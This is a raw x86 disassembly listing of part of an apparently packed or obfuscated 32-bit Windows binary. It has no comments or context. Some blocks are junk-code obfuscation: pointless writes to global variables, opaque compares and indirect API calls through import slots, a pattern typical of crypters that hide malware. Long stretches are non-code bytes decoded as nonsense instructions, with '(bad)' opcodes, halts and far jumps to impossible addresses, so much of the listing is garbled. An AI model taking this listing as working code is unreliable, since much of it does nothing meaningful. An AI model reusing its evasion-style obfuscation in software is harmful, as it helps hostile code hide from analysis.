  4166a4:	xlat   BYTE PTR ds:[ebx]
  4166a5:	xchg   BYTE PTR [eax-0x5d4a9ba6],cl
  4166ab:	jb     0x416669
  4166ad:	lods   eax,DWORD PTR ds:[esi]
  4166ae:	hlt    
  4166af:	fadd   QWORD PTR [ecx+eiz*2+0x7e]
  4166b3:	imul   ecx,DWORD PTR [edx+0x2d957196],0x8b8f6dd8
  4166bd:	popf   
  4166be:	icebp  
  4166bf:	jmp    0x9a17c7dd
  4166c4:	dec    bh
  4166c6:	mov    edx,0x3ba23bb6
  4166cb:	ja     0x416692
  4166cd:	adc    eax,0x1eeb21c8
  4166d2:	jbe    0x416715
  4166d4:	mov    cl,bh
  4166d6:	add    al,0x1e
  4166d8:	lahf   
  4166d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166da:	inc    ecx
  4166db:	ror    edi,cl
  4166dd:	xor    esp,edx
  4166df:	add    al,0x66
  4166e1:	and    al,0xe1
  4166e3:	(bad)  
  4166e4:	clc    
  4166e5:	mov    WORD PTR [edx+ebx*8+0x7b],es
  4166e9:	fs leave 
  4166eb:	test   BYTE PTR ds:0x69920e72,al
  4166f1:	or     dh,BYTE PTR [esp+ebp*4]
  4166f4:	add    al,0xa4
  4166f6:	or     DWORD PTR [esi-0x2b82a487],0x4b
  4166fd:	or     DWORD PTR [edi-0x7f],ebp
  416700:	xor    edx,DWORD PTR [edx]
  416702:	lock push ebx
  416704:	and    bh,BYTE PTR [ecx+0x6b9ec311]
  41670a:	int    0xa6
  41670c:	arpl   WORD PTR [edx+eax*2],dx
  41670f:	xlat   BYTE PTR ds:[ebx]
  416710:	ss (bad) 
  416712:	adc    edx,DWORD PTR [edx-0x4b]
  416715:	add    al,0xf9
  416717:	inc    edx
  416718:	lock mov dh,0x6e
  41671b:	hlt    
  41671c:	xchg   BYTE PTR gs:[ebp+edx*2+0x11],al
  416721:	shl    WORD PTR [ebx+ebp*2+0x4b],cl
  416726:	into   
  416727:	test   eax,0xed47f075
  41672c:	add    al,0xa5
  41672e:	out    dx,al
  41672f:	push   esi
  416730:	mov    ss,WORD PTR [esi+0x688a9d20]
  416736:	sbb    BYTE PTR [ebp*4-0x5f4cd09c],dl
  41673d:	sbb    BYTE PTR [edx+0x43c3f433],bh
  416743:	out    0x3d,eax
  416745:	ds jne 0x4167ad
  416748:	neg    DWORD PTR [ebx-0x645ec823]
  41674e:	in     al,dx
  41674f:	or     eax,0xe47762fa
  416754:	aam    0x40
  416756:	iret   
  416757:	aam    0x3b
  416759:	mov    edi,0x3f35d596
  41675e:	adc    al,0xe
  416760:	test   DWORD PTR [ebx-0x63],ebx
  416763:	rol    BYTE PTR [ecx+0x10],1
  416766:	inc    ecx
  416767:	dec    ebx
  416768:	lahf   
  416769:	and    DWORD PTR [esi],ebx
  41676b:	xor    eax,0x978cf5cb
  416770:	dec    ebx
  416771:	mov    al,BYTE PTR [ebp-0x4100a589]
  416777:	out    0xaf,al
  416779:	adc    eax,0x488e14f
  41677e:	sbb    cl,BYTE PTR [ebx+0x4503c845]
  416784:	les    ecx,FWORD PTR [ebx-0x3dcc3fab]
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422574
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422560
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x428555,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428569,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x4284d5,0x96c
  416847:	cmp    DWORD PTR ds:0x428555,0x0
  41684e:	jbe    0x416866
  416854:	push   0x428147
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428565
  416866:	and    DWORD PTR ds:0x4284c9,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x428429
  416876:	sub    ecx,DWORD PTR ds:0x428501
  41687c:	mov    DWORD PTR ds:0x428429,ecx
  416882:	mov    ecx,DWORD PTR ds:0x422928
  416888:	and    DWORD PTR ds:0x428375,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428565,0x4284d9
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x42845d,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x428349,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x42841d,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x428355,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x42845d,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42847d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x42841d
  4168f9:	movzx  eax,WORD PTR ds:0x428479
  416900:	cmp    DWORD PTR ds:0x42841d,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428579
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x428335,0x42841d
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428365,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x42854d,0x428569
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x428411,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428475
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x42845d
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428561,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x42840d,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x428445,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x42835d,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x42832d,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x428351
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	jmp    0xd2555e3
  416a32:	aam    0xc0
  416a34:	mov    esi,0xbebec235
  416a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a3b:	jae    0x4169d1
  416a3d:	shl    BYTE PTR [edx-0x44],cl
  416a40:	cmp    ebp,ecx
  416a42:	test   eax,0x8b2fe5fd
  416a47:	(bad)  
  416a49:	aaa    
  416a4a:	ins    BYTE PTR es:[edi],dx
  416a4b:	hlt    
  416a4c:	cli    
  416a4d:	dec    edx
  416a4e:	sbb    al,ah
  416a50:	push   cs
  416a51:	jbe    0x416a77
  416a53:	pop    edi
  416a54:	xlat   BYTE PTR ds:[ebx]
  416a55:	fstp   QWORD PTR [ecx-0x576c7d9]
  416a5b:	add    DWORD PTR [edx],esi
  416a5d:	mov    eax,0x1de80bab
  416a62:	xchg   esi,eax
  416a63:	int    0x21
  416a65:	out    dx,eax
  416a66:	es fwait
  416a68:	je     0x416a33
  416a6a:	jmp    0xa0ba09f2
  416a6f:	jp     0x416a5c
  416a71:	daa    
  416a72:	movlps xmm5,QWORD PTR [edx-0x1e81fe0a]
  416a79:	mov    ebp,0x811fd2e1
  416a7e:	xor    eax,DWORD PTR [edi]
  416a80:	mov    edx,0x83dac01
  416a85:	inc    ecx
  416a86:	test   BYTE PTR [ebx-0x67531922],0xcc
  416a8d:	push   edi
  416a8e:	add    dl,BYTE PTR [eax]
  416a90:	sar    BYTE PTR [ecx],cl
  416a92:	lods   eax,DWORD PTR ds:[esi]
  416a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a94:	int    0x3b
  416a96:	mov    ebx,DWORD PTR [ebx-0x6405c83a]
  416a9c:	lock sub al,ah
  416a9f:	cli    
  416aa0:	dec    edi
  416aa1:	push   0xffffffc0
  416aa3:	js     0x416a46
  416aa5:	sti    
  416aa6:	lock outs dx,DWORD PTR ds:[esi]
  416aa8:	lahf   
  416aa9:	(bad)  
  416aaa:	not    bl
  416aac:	aaa    
  416aad:	xchg   ecx,eax
  416aae:	jmp    0x472fde1c
  416ab3:	popa   
  416ab4:	daa    
  416ab5:	bound  ebp,QWORD PTR [esi+0x3]
  416ab8:	or     bl,BYTE PTR [esi]
  416aba:	call   0x7523:0x596a2f60
  416ac1:	jp     0x416a5d
  416ac3:	inc    esi
  416ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac5:	iret   
  416ac6:	ins    BYTE PTR es:[edi],dx
  416ac7:	fnstcw WORD PTR [eax+0x19]
  416aca:	mov    DWORD PTR gs:[ecx-0x77808bbe],edi
  416ad1:	push   cs
  416ad2:	mov    ds:0x65fc4df4,al
  416ad7:	mov    ch,0xa8
  416ad9:	jp     0x416a5e
  416adb:	lods   eax,DWORD PTR ds:[esi]
  416adc:	mov    cl,0xe
  416ade:	in     eax,0xa0
  416ae0:	push   0x3d
  416ae2:	(bad)  
  416ae3:	pop    esp
  416ae4:	ins    BYTE PTR es:[edi],dx
  416ae5:	(bad)  
  416ae6:	frstor [ebx]
  416ae8:	fbld   TBYTE PTR [ebx]
  416aea:	cmp    cl,dh
  416aec:	jmp    0x1fa8:0x7c91dd23
  416af3:	jl     0x416a9a
  416af5:	inc    esp
  416af6:	add    DWORD PTR [ecx-0x4616bec1],ebx
  416afc:	call   0xecada954
  416b01:	imul   edi,DWORD PTR [eax],0x75da38b5
  416b07:	mov    eax,0xba724643
  416b0c:	bound  esp,QWORD PTR [ebx-0x3]
  416b0f:	imul   ecx,DWORD PTR [ebx+0x4f],0xd30b77b
  416b16:	cld    
  416b17:	les    esi,FWORD PTR [edi-0x179f4cc7]
  416b1d:	mov    ds:0x6c7b868,al
  416b22:	pushf  
  416b23:	or     eax,0x8311928e
  416b28:	pop    ecx
  416b29:	push   esi
  416b2a:	test   BYTE PTR [ebp-0x9],dl
  416b2d:	add    BYTE PTR [edx+0x0],ah
  416b30:	sub    dl,BYTE PTR [eax]
  416b32:	nop
  416b33:	int    0x67
  416b35:	dec    esi
  416b36:	push   ecx
  416b37:	xchg   BYTE PTR [ebx+0x4c27a4f8],dl
  416b3d:	mov    DWORD PTR [ecx-0xa],0xce1a5a5d
  416b44:	rcr    BYTE PTR [edi],0x35
  416b47:	imul   ebp,DWORD PTR [ebx+edi*4],0xe1f597f8
  416b4e:	or     ebx,0x8
  416b51:	add    eax,0x75200a47
  416b56:	lods   al,BYTE PTR ds:[esi]
  416b57:	cmp    DWORD PTR [esi-0x35],ebx
  416b5a:	test   DWORD PTR [edx],0xee3940d0
  416b60:	sub    BYTE PTR [eax+0x64add50c],cl
  416b66:	mov    DWORD PTR [ebp-0x2b],edx
  416b69:	lods   eax,DWORD PTR ds:[esi]
  416b6a:	hlt    
  416b6b:	add    edi,eax
  416b6d:	retf   
  416b6e:	or     BYTE PTR [ebx+0x51],al
  416b71:	fistp  QWORD PTR cs:[ebx-0x59]
  416b75:	arpl   WORD PTR [edx],sp
  416b77:	cs call 0xa0cc4121
  416b7d:	xchg   edi,edi
  416b7f:	das    
  416b80:	fwait
  416b81:	inc    eax
  416b82:	mov    es,WORD PTR [esi-0x2d]
  416b85:	ins    DWORD PTR es:[edi],dx
  416b86:	je     0x416b28
  416b88:	pop    ebp
  416b89:	mov    BYTE PTR [esi],dl
  416b8b:	(bad)  
  416b8d:	mov    dh,0x35
  416b8f:	xor    BYTE PTR [esi-0x71],dh
  416b92:	jbe    0x416b95
  416b94:	mov    ecx,0xa9dcd410
  416b99:	push   ebx
  416b9a:	js     0x416c09
  416b9c:	jo     0x416b89
  416b9e:	cld    
  416b9f:	ins    BYTE PTR es:[edi],dx
  416ba0:	mov    edi,DWORD PTR ss:[edi-0x27391dca]
  416ba7:	mov    ah,0x98
  416ba9:	jbe    0x416b46
  416bab:	inc    edx
  416bac:	aaa    
  416bad:	jne    0x416b54
  416baf:	jg     0x416b9b
  416bb1:	cmc    
  416bb2:	adc    eax,0x70767419
  416bb7:	fpatan 
  416bb9:	lock pop ss
  416bbb:	push   ss
  416bbc:	push   esp
  416bbd:	ins    BYTE PTR es:[edi],dx
  416bbe:	sbb    DWORD PTR [esi-0x44],ecx
  416bc1:	pop    ebx
  416bc2:	push   ss
  416bc3:	mov    ds:0xd1ced66e,al
  416bc8:	lea    esi,[edi+0x31902723]
  416bce:	sub    eax,0xdae59ae2
  416bd3:	inc    eax
  416bd4:	sbb    dl,al
  416bd6:	clc    
  416bd7:	xchg   edi,eax
  416bd8:	jne    0x416bd7
  416bda:	mov    cl,0xac
  416bdc:	push   edi
  416bdd:	or     al,0xa3
  416bdf:	in     al,dx
  416be0:	dec    eax
  416be1:	out    0x1b,eax
  416be3:	sbb    al,0xdb
  416be5:	sahf   
  416be6:	clc    
  416be7:	mov    esi,0x7dff3ccf
  416bec:	clc    
  416bed:	ss ret 
  416bef:	jge    0x416bf5
  416bf1:	jmp    0x781bb995
  416bf6:	scas   al,BYTE PTR es:[edi]
  416bf7:	add    DWORD PTR [eax+0x66d5da86],edi
  416bfd:	bound  esp,QWORD PTR [edi]
  416bff:	fisubr WORD PTR [ebx+0x660fdbc1]
  416c05:	rdpmc  
  416c07:	xor    edx,DWORD PTR [eax+esi*1]
  416c0a:	in     al,dx
  416c0b:	jl     0x416bf7
  416c0d:	xor    edi,edi
  416c0f:	xor    eax,0x1fb1b9e7
  416c14:	aaa    
  416c15:	sahf   
  416c16:	leave  
  416c17:	xor    DWORD PTR [edi],esi
  416c19:	inc    ecx
  416c1a:	xchg   edi,eax
  416c1b:	bound  esp,QWORD PTR [ecx+0x78]
  416c1e:	gs mov dh,0x43
  416c21:	pop    edx
  416c22:	imul   ebp,DWORD PTR [esi-0x15],0xee62d706
  416c29:	mov    edi,0x8cf6149f
  416c2e:	int3   
  416c2f:	or     BYTE PTR [ebp+0x6bf601ed],ch
  416c35:	mov    dh,0x65
  416c37:	retf   0xc3be
  416c3a:	cmp    edx,DWORD PTR [esi+edi*1]
  416c3d:	mov    edi,0x11654d5e
  416c42:	jmp    0x416c45
  416c44:	push   esi
  416c45:	nop
  416c46:	sbb    ch,ah
  416c48:	mov    bl,0xdf
  416c4a:	stos   BYTE PTR es:[edi],al
  416c4b:	(bad)  
  416c4c:	mov    bh,0x24
  416c4e:	imul   ebx,DWORD PTR [ebx+0x675d2318],0x6a
  416c55:	mov    BYTE PTR [edi+0x2c92a9c9],dl
  416c5b:	xor    al,0x1e
  416c5d:	iret   
  416c5e:	test   DWORD PTR [ebp+0x22],esi
  416c61:	arpl   bp,bx
  416c63:	icebp  
  416c64:	and    DWORD PTR [esp+eax*4-0x3e79017e],esp
  416c6b:	aaa    
  416c6c:	stos   DWORD PTR es:[edi],eax
  416c6d:	mov    ah,0x27
  416c6f:	sbb    edi,DWORD PTR [ecx+eax*2-0x24921f74]
  416c76:	rol    BYTE PTR [ecx+0x2444c73c],cl
  416c7c:	push   eax
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x428431
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x428439,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x4284f1,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x4284d5,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x428359,0x0
  416d09:	mov    DWORD PTR ds:0x428341,edi
  416d0f:	mov    DWORD PTR ds:0x428445,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x4284fd,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x428419,0xa9d
  416d37:	cmp    DWORD PTR ds:0x428359,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428561,0x42836d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428365
  416d72:	adc    DWORD PTR ds:0x428439,ecx
  416d78:	cmp    DWORD PTR ds:0x428555,0x0
  416d7f:	mov    DWORD PTR ds:0x428579,edi
  416d85:	mov    DWORD PTR ds:0x428579,ebx
  416d8b:	mov    DWORD PTR ds:0x42840d,0x662b
  416d95:	mov    DWORD PTR ds:0x428561,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x428355,ebx
  416daa:	cmp    DWORD PTR ds:0x428555,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x4281db
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x428531
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42856d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x428551
  416de1:	and    DWORD PTR ds:0x428461,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x428359
  416df3:	add    DWORD PTR ds:0x42833d,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428369,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x428481,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x428351,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x428431
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x42854d,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x428545
  416e57:	mov    ecx,DWORD PTR ds:0x428481
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x428451,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x42854d,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x428411,edi
  416e87:	and    DWORD PTR ds:0x428371,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x428441
  416e97:	or     DWORD PTR ds:0x428575,ecx
  416e9d:	add    DWORD PTR ds:0x4284e1,ebx
  416ea3:	or     DWORD PTR ds:0x4284d1,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428365
  416eb3:	sub    DWORD PTR ds:0x4284c9,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428375,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x42840d,0x0
  416ecf:	mov    DWORD PTR ds:0x428331,0x5921
  416ed9:	mov    DWORD PTR ds:0x4284e1,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x42840d,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x428351
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x4284d1,0x2a49
  416f10:	and    DWORD PTR ds:0x428561,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x42845d
  416f21:	adc    DWORD PTR ds:0x428475,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x428545
  416f2d:	adc    DWORD PTR ds:0x428421,ecx
  416f33:	or     DWORD PTR ds:0x428361,0x75b4
  416f3d:	adc    DWORD PTR ds:0x4284c5,edx
  416f43:	or     DWORD PTR ds:0x4284fd,0x469c
  416f4d:	or     DWORD PTR ds:0x428459,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428461,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x428421
  416f70:	or     ecx,DWORD PTR ds:0x428501
  416f76:	mov    DWORD PTR ds:0x428421,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x428555,0x428551
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428375,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x428405,0x428445
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x428551,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x428349,0x42832d
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x42832d,0x428365
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x428459,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42836d,0x42832d
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x428425,0x4284f5
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x4284d1,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x428451,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x4284d5,0x0
  417044:	not    DWORD PTR ds:0x428419
  41704a:	mov    DWORD PTR ds:0x4284dd,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x42835d
  417060:	cmp    DWORD PTR ds:0x4284d5,0x0
  417067:	jae    0x41709b
  41706d:	push   0x4281b5
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x428339,edi
  417091:	xor    DWORD PTR ds:0x428459,0x58f
  41709b:	sbb    DWORD PTR ds:0x42846d,ecx
  4170a1:	sub    DWORD PTR ds:0x428561,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x4283dd
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x428581,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428461
  4170c0:	add    esi,DWORD PTR ds:0x428501
  4170c6:	mov    DWORD PTR ds:0x428461,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42836d,0x428441
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x4170d6
  417104:	(bad)  
  417105:	out    0xe3,eax
  417107:	test   al,bl
  417109:	sar    BYTE PTR [esi-0x41413dcb],0xc5
  417110:	sti    
  417111:	pop    ebp
  417112:	xchg   esp,eax
  417113:	push   ds
  417114:	inc    ecx
  417115:	ret    
  417116:	jns    0x417151
  417118:	add    esi,DWORD PTR [esi+0x2ca3c75e]
  41711e:	not    bl
  417120:	scas   eax,DWORD PTR es:[edi]
  417121:	nop
  417122:	inc    eax
  417123:	pop    es
  417124:	mul    DWORD PTR [ebx+0x17f6a5b3]
  41712a:	dec    edx
  41712b:	out    0x7b,eax
  41712d:	sub    ebp,DWORD PTR [esi+0x73]
  417130:	inc    edi
  417131:	xchg   ecx,eax
  417132:	add    DWORD PTR [ecx-0x7349be3e],ecx
  417138:	inc    eax
  417139:	(bad)  
  41713a:	cs jl  0x417114
  41713d:	mov    ch,0xbd
  41713f:	mov    al,ds:0xd474d1e7
  417144:	xor    DWORD PTR [esp+ebx*8+0x25b0e492],esp
  41714b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41714c:	push   0x7
  41714e:	add    cl,BYTE PTR ds:0xc5fe7d5a
  417154:	sub    BYTE PTR [edi],dl
  417156:	and    DWORD PTR [ecx+0x715e3832],edx
  41715c:	sub    al,0x4c
  41715e:	outs   dx,DWORD PTR ds:[esi]
  41715f:	ss scas al,BYTE PTR es:[edi]
  417161:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417163:	mov    dl,0xf3
  417165:	xor    eax,0xc61da9c
  41716a:	mov    esi,esp
  41716c:	xor    dh,BYTE PTR [edx+0x15e1aeee]
  417172:	fldcw  WORD PTR [eax-0x7c]
  417175:	(bad)  
  417176:	jae    0x4171ef
  417178:	push   esp
  417179:	mov    ebp,0x43a5a48c
  41717e:	pop    esi
  41717f:	ins    BYTE PTR es:[edi],dx
  417180:	inc    esi
  417181:	sub    BYTE PTR [eax+0x2e],cl
